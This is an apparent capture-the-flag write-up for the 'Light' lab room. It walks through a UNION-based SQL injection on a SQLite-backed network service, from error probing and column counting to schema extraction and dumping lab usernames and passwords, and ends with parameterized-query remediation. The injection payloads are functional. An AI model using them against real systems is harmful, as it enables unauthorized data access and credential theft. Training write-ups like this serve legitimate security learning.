HackTheBox / TryHackMe Walkthrough: Light
=========================================
In this write-up, we will walk through the solution for Light, a challenge focusing on identifying and exploiting a SQL Injection vulnerability in a custom network application to extract database schema and sensitive administrative records.

**1. Initial Reconnaissance**
-----------------------------
- Upon connecting to the target machine via Netcat (nc TARGET_IP 1337), we are greeted by a basic database query interface:
```
Welcome to the Light database application
Please enter your username: smokey
```
- Providing a standard username like smokey completes the query successfully. 
- To test for potential input handling flaws, we begin by injecting single quotes (') into the input field to check for standard SQL errors.


**2. Vulnerability Discovery (SQL Injection)**
----------------------------------------------
- Submitting a single quote ' triggers a syntax error from the application backend:
```
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```
Analysis
- The error message provides two critical pieces of information:
- Unsanitized Input: The input is concatenated directly into the SQL query without proper escaping or parameterization.
- Query Structure: The query appends a LIMIT 30 clause at the end. Based on this, we can infer the structural query executing on the backend:
```
SELECT password FROM users WHERE username='<USER_INPUT>' LIMIT 30;
```


**3. Enumerating the Query Layout**
-----------------------------------
- To extract arbitrary data using a UNION-based injection, we first need to determine the exact number of columns returned by the original query.
- Test 1: Testing a Single Column
```
Please enter your username: ' Union Select NULL '
Password: None
```
- Test 2: Testing Two Columns
```
Please enter your username: ' Union Select NULL, NULL '
Error: SELECTs to the left and right of UNION do not have the same number of result columns
this confirmed 1 column retrieve 
```
Conclusion
- The baseline query returns exactly 1 column (the password field).


**4. Database Fingerprinting & Schema Extraction**
--------------------------------------------------
- With the injection vector established, we attempt to fingerprint the database backend and extract table schemas.
Attempting MySQL Syntax
- We initially attempt to query information_schema.schemata:
```
Please enter your username: ' Union Select group_concat(table_schema) FROM information_schema.schemata '
Error: no such table: information_Schema.schemata
```
- The failure confirms the backend is not running MySQL or PostgreSQL.

Pivoting to SQLite
- Next, we target SQLite metadata by querying the sqlite_master table:
```
Please enter your username: ' Union Select sql FROM sqlite_master '
```
Response:
```
Password: CREATE TABLE admintable (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password INTEGER)
```
- To view the complete schema across all database objects, we aggregate the results using group_concat():
```
Please enter your username: ' Union Select group_concat(sql) FROM sqlite_master '
```
Response:
```
Password: CREATE TABLE usertable (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password INTEGER),
          CREATE TABLE admintable (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password INTEGER)
```
We have identified two target tables:
- usertable
- admintable


**5. Data Exfiltration**
------------------------
- Now that we know the structure of the database, we can extract entries from both tables.
- Extracting usertable Credentials
1 Usernames:
```
Please enter your username: ' Union Select group_concat(username) from usertable '
```
- Output: alice,rob,john,michael,smokey,hazel,ralph,steve

2 Passwords:
```
Please enter your username: ' Union Select group_concat(password) from usertable '
```
- Output: tF8tj2o94WE4LKC,yAn4fPaF2qpCKpR,e74tqwRh2oApPo6,7DV4dwA0g5FacRe,vYQ5ngPpw8AdUmL,EcSuU35WlVipjXG,YO1U9O1m52aJImA,WObjufHX1foR8d7

Extracting admintable Records & Flag
- Next, we dump the sensitive records from admintable:

1. Usernames:
```
Please enter your username: ' Union Select group_concat(username) from admintable '
```
- Output: redacted,flag

2. Flag, Password Retrieval:
```
Please enter your username: ' Union Select group_concat(password) from admintable '
```
- Output: redacted,THM{redacted}


**6. Remediation & Key Takeaways**
-----------------------------------
- The root cause of this vulnerability lies in string concatenation within SQL statements.
- To prevent SQL Injection vulnerabilities, all dynamic input should be handled using parameterized queries (prepared statements) rather than string manipulation.

```
# Vulnerable Code (Conceptual)
query = f"SELECT password FROM users WHERE username='{user_input}' LIMIT 30;"
cursor.execute(query)

# Secure Code (SQLite / Python Example)
query = "SELECT password FROM users WHERE username=? LIMIT 30;"
cursor.execute(query, (user_input,))
```
